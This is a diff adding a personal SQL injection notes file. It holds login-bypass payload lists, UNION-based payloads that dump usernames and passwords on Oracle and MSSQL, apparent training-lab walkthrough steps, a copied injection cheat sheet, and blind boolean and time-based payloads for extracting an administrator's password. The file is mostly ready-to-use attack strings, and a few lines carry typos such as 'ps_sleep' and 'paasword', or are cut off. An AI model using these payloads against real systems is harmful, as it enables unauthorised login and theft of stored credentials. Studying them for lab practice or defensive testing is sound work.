@@ -1,0 +1,247 @@
+user’ or 1=1 -- -
+pass’ or 1=1 -- - 
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+=========================================================================================================
+'OR 1=1 --   
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—         => this will fetch everything in a particular category
+
+
+                                  
+ 
+admin' --,administrator'-- ,'admin';-- ', admin' #, admin'/*           => this will log in a user without valid password
+
+'+UNION+SELECT+username,+password+FROM+users--  => Use the following payload to retrieve the contents of the users table
+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- =>Use the following payload to retrieve the contents of the users table
+
+
+
+=============================================================oracle_sql================================================================
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+----------------------------------------------------------------------------------------------------------------------------
+ 
+'+UNION+SELECT+BANNER,+NULL+FROM+$version-- => this will fetch the database version
+'+UNION+SELECT+'abc','def'+FROM+dual--   => returning two columns of the db .i.e abc and def
+
+query is returning two columns abc and def
+
+'+UNION+SELECT+'abc','def'+FROM+dual--
+
+Use the following payload to retrieve the list of tables in the database:
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+
+
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_A
+
+===============================================================mssql===========================================================
+'+UNION+SELECT+@@version,+NULL#   => this will fetch the database version
+'+UNION+SELECT+'abc','def'#       => returning two columns of the db .i.e abc and def
+
+query is returning two columns abc and def
+
+'+UNION+SELECT+'abc','def'--
+
+Use the following payload to retrieve the list of tables in the database:
+
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+
+Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
+
+Modify the category parameter to add an additional column containing a null value:
+'+UNION+SELECT+NULL,NULL--
+Continue adding null values until the error disappears and the response includes additional content containing the null values. 
+
+---------------------------------------------------------------------------------------------------------------------
+
+Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
+'+UNION+SELECT+NULL,NULL,NULL--
+
+Try replacing each null with the random value provided by the lab, for example:
+'+UNION+SELECT+'abcdef',NULL,NULL--
+If an error occurs, move on to the next null and try that instead. 
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+SQL injection cheat sheet
+
+This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+String concatenation
+
+You can concatenate together multiple strings to make a single string.
+Oracle 	'foo'||'bar'
+Microsoft 	'foo'+'bar'
+PostgreSQL 	'foo'||'bar'
+MySQL 	'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+Substring
+
+You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
+Oracle 	SUBSTR('foobar', 4, 2)
+Microsoft 	SUBSTRING('foobar', 4, 2)
+PostgreSQL 	SUBSTRING('foobar', 4, 2)
+MySQL 	SUBSTRING('foobar', 4, 2)
+Comments
+
+You can use comments to truncate a query and remove the portion of the original query that follows your input.
+Oracle 	--comment
+Microsoft 	--comment
+/*comment*/
+PostgreSQL 	--comment
+/*comment*/
+MySQL 	#comment
+-- comment [Note the space after the double dash]
+/*comment*/
+Database version
+
+You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+Oracle 	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version
+Database contents
+
+You can list the tables that exist in the database, and the columns that those tables contain.
+Oracle 	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+Microsoft 	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+PostgreSQL 	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+MySQL 	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+Conditional errors
+
+You can test a single boolean condition and trigger a database error if the condition is true.
+Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+Extracting data via visible error messages
+
+You can potentially elicit error messages that leak sensitive data returned by your malicious query.
+Microsoft 	SELECT 'foo' WHERE 1 = (SELECT 'secret')
+
+> Conversion failed when converting the varchar value 'secret' to data type int.
+PostgreSQL 	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+
+> invalid input syntax for integer: "secret"
+MySQL 	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+
+> XPATH syntax error: '\secret'
+Batched (or stacked) queries
+
+You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+Oracle 	Does not support batched queries.
+Microsoft 	QUERY-1-HERE; QUERY-2-HERE
+PostgreSQL 	QUERY-1-HERE; QUERY-2-HERE
+MySQL 	QUERY-1-HERE; QUERY-2-HERE
+Note
+
+With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+Time delays
+
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+Oracle 	dbms_pipe.receive_message(('a'),10)
+Microsoft 	WAITFOR DELAY '0:0:10'
+PostgreSQL 	SELECT pg_sleep(10)
+MySQL 	SELECT SLEEP(10)
+Conditional time delays
+
+You can test a single boolean condition and trigger a time delay if the condition is true.
+Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 
+
+----------------------------------------------------------conditional_blind_sqli-----------------------------------------------------------
+
+conditional_responses ==> will return #welcome if query is true(#returning value is depends in site to site)
+conditional_error ==> will return status code 500 error if query is true
+
+' and 2=1--
+' and 2=2--
+' and (SELECT 'a' FROM users LIMIT 1)='a'-- 						    => if letter a in user namespace
+' anD (SELECT 'a' FROM users where username='administrator')='a'--	 		    => if letter a in word administrator
+' anD (SELECT 'a' FROM users where username='administrator' AND LENGTH(paasword)>10)='a'--  => if admin's password less than 10 chracter or not
+' anD (SELECT SUBSTRING(password,1,1) FROM users where username='administrator')='a'-- =>if 1st character of password is a or not with substring
+
+
+===================================time_based_conditional_sqli=============================================================================
+#if there is a table called users the website will load slow for 10seconds(condition is true)
+
+||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE ps_sleep(0) END FROM users)--
+
+#if there is a username called administrator the website will load slow for 10seconds(condition is true)
+||((SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE ps_sleep(0) END FROM users)
+
+||((SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE ps_sleep(0) END FROM users)
+
+||((SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE ps_sleep(0) END FROM users)
+
+||((SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE ps_sleep(0) END FROM users)
